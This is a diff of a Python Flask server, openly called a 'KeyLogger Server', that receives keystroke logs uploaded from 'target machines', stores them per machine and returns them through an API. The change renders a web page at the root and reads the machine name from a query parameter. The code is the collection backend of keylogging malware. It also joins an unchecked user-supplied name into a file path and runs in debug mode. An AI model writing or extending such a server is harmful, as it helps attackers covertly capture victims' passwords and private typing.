@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, render_template
 import time
 import os
 import logging
@@ -20,8 +20,8 @@ def generate_log_filename() -> str:
 
 
 @app.route('/')
-def home():
-    return "KeyLogger Server is Running"
+def index():
+    return render_template('index.html')
 
 
 @app.route('/api/upload', methods=['POST'])
@@ -54,12 +54,15 @@ def get_target_machines_list():
 #קבלת מידע לפי מחשבים
 
 
-@app.route('/api/get_keystrokes?machine=<target_machine>', methods=['GET'])
-def get_target_machine_key_strokes(target_machine):
-    machine_folder=os.path.join(DATA_FOLDER,target_machine)
+@app.route('/api/get_target_machine_key_strokes', methods=['GET'])
+def get_target_machine_key_strokes():
+    target_machine = request.args.get("machine")
+    if not target_machine:
+        return jsonify({"error": "Missing 'machine' parameter"}), 400
 
+    machine_folder = os.path.join(DATA_FOLDER, target_machine)
     if not os.path.exists(machine_folder):
-        return jsonify({"error":"Machine not found"}), 404
+        return jsonify({"error": "Machine not found"}), 404
 
     key_strokes = []
     for filename in sorted(os.listdir(machine_folder)):
@@ -75,3 +78,4 @@ def get_target_machine_key_strokes(target_machine):
 if __name__ == '__main__':
 
     app.run(debug=True)
+
